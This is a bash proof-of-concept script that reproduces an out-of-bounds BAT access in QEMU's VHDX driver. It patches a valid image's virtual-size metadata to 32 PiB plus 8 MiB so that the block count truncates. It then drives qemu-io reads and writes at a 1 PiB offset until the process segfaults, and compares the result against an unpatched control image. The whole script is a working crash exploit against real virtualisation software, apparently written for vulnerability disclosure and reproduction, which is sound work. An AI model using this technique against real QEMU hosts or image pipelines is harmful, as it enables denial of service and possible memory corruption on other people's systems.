#!/bin/bash
# QemuOverrun — reproduce QEMU VHDX BAT out-of-bounds access (real binary).
#
# Builds a valid VHDX, patches its "Virtual Disk Size" metadata to 32 PiB + 8 MiB
# (so the uint32 block count truncates and the BAT gets 1 entry while the disk is
# 2^46 sectors), then drives the REAL qemu-io against it.  Reading/writing at a
# high-but-valid offset computes a BAT index far past the BAT allocation and the
# process dies with SIGSEGV (exit 139) — the out-of-bounds access.
#
# Control (same image, unpatched): the 1 MiB image reports a clean I/O error for
# the out-of-range offset; only the oversized-size image crashes.
set -u
cd "$(dirname "$0")"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

GOOD="$WORK/base.vhdx"
BAD="$WORK/malicious.vhdx"
OFF=1125899906842624   # 1 PiB -> sector 2^41 -> bat_idx = 2^27 (BAT has 1 entry / ~1 MiB alloc)

echo "=== [1/5] create a valid 1 MiB VHDX ==="
qemu-img create -f vhdx "$GOOD" 1M 2>&1 || { echo "qemu-img create failed"; exit 2; }

echo
echo "=== [2/5] patch Virtual Disk Size metadata to 2^55 + 2^23 ==="
python3 make_vhdx.py "$GOOD" "$BAD" || { echo "patch failed"; exit 2; }

echo
echo "=== [3/5] qemu-img info (vulnerable parser accepts the huge size) ==="
qemu-img info "$BAD" 2>&1
grep -q "32 PiB" <(qemu-img info "$BAD" 2>&1) \
  && echo "[+] CONFIRMED: virtual size accepted as 32 PiB (no VHDX_MAX_IMAGE_SIZE bound)" \
  || echo "[!] unexpected virtual size"

echo
echo "=== [4/5] CONTROL — the UNPATCHED 1 MiB image ==="
echo "--- read offset 0 on the clean image (must succeed) ---"
qemu-io -f vhdx -c "read 0 512" "$GOOD" 2>&1
echo "    [clean read@0 exit: $?]"
echo "--- read the same 1 PiB offset on the clean image (clean I/O error, NO crash) ---"
qemu-io -f vhdx -c "read $OFF 512" "$GOOD" 2>&1
echo "    [clean read@1PiB exit: $?  (expect a clean error, not SIGSEGV)]"

echo
echo "=== [5/5] EXPLOIT — the PATCHED image drives BAT out-of-bounds ==="
echo "--- read at offset $OFF ---"
qemu-io -f vhdx -c "read $OFF 512" "$BAD" 2>&1
RRC=$?
echo "    [read exit code: $RRC]"

echo "--- write at offset $OFF ---"
qemu-io -f vhdx -c "write $OFF 512" "$BAD" 2>&1
WRC=$?
echo "    [write exit code: $WRC]"

echo
if [ "$RRC" -eq 139 ] || [ "$WRC" -eq 139 ]; then
    echo "QEMUOVERRUN-OK: qemu-io died with SIGSEGV (exit 139) on out-of-bounds BAT access"
    echo "Marker: Segmentation fault confirmed for BOTH read and write paths."
    exit 0
else
    echo "QEMUOVERRUN-FAIL: no SIGSEGV observed (read=$RRC write=$WRC)"
    exit 1
fi
